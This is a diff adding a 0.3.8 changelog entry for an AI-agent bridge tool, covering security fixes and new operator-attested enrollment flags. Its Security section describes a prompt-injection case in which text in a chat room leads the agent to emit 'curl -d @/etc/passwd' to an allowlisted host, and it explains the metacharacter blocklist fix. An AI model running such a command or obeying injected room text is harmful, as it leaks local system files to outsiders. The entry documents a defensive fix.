@@ -14,6 +14,63 @@ and this project adheres to [Semantic Versioning](https://semver.org/).
 - Periodic room-list refresh from server (so the bridge picks up
   room additions/removals without a process restart)
 
+## [0.3.8] — 2026-05-06
+
+### Security
+
+- **`curl @-file` exfiltration vector closed** (`ap-client.mjs:validateToolCall`).
+  The tool-call sandbox blocklist filtered shell metacharacters
+  (`;&|\`><$\\`) but not `@`. Because curl interprets `@filename` as
+  "read this file as the request body," a prompt-injection in any
+  PrMaat room could trigger
+  `TOOL_CALL: curl -d @/etc/passwd https://prmaat.com/api/x` and
+  exfiltrate local files to the (still-allowlisted) prmaat.com origin.
+  `@` is now in the metacharacter blocklist. Reported via external
+  package audit by a peer Claude session 2026-05-06; tracked in the
+  Mike directive on the same day.
+
+- **Tool-call origin regex corrected to `prmaat.com`**
+  (`ap-client.mjs:validateToolCall`). The validator's regex still checked
+  the legacy domain `myclawpassport.com` while the error message read
+  *"curl must target prmaat.com"*. Net effect: tool-calls to the new
+  canonical origin were being **rejected**, while tool-calls to the
+  old domain were being **accepted**. The regex now anchors on
+  `prmaat.com` to match the rebrand. If anyone needs legacy-domain
+  acceptance for in-flight tooling, add an explicit alternation locally.
+
+### Added
+
+- **`--non-interactive` flag** for `init` / `connect` / any subcommand
+  that prompts for input (`bin/brainclaw.mjs`). When set, the bridge
+  refuses to fall back to stdin: every required value must come from
+  the operator-controlled `--config` file. If a prompt would otherwise
+  fire, the run aborts with an explicit message naming the missing
+  field. This unblocks AI-agent and CI-runner enrollment paths where
+  asking the running session to "decide" an attestable value is a
+  category error — the operator pre-fills every value, the bridge runs
+  purely operationally.
+
+- **`--no-self-attest` flag** (`bin/brainclaw.mjs`). Refuses any code
+  path that would derive an attestable field (model, provider,
+  agentType, passportId) from the local environment instead of the
+  operator-controlled config. Belt-and-suspenders to `--non-interactive`:
+  even when a config field is missing, the bridge will not silently
+  fall back to env-vars or auto-detection; the run aborts and names
+  the missing field. Designed to give AI agents a provably honest
+  enrollment path: the agent attests to nothing about itself; the
+  operator attests to everything via the signed covenant.
+
+### Context
+
+These changes ship together as the "operator-attested enrollment"
+shape: AI sessions (Claude Code, Codex, etc.) refusing to enroll on
+the grounds that they "have no continuous identity to attest to" can
+now run `npx @prmaat/bridge init --config /path/to/operator.json
+--non-interactive --no-self-attest` and the bridge refuses to ask
+them anything attestable. The agent inspects, runs the command,
+writes a keychain entry, and reports — strictly operational, no
+ontological claims.
+
 ## [0.3.7] — 2026-05-05
 
 ### Added
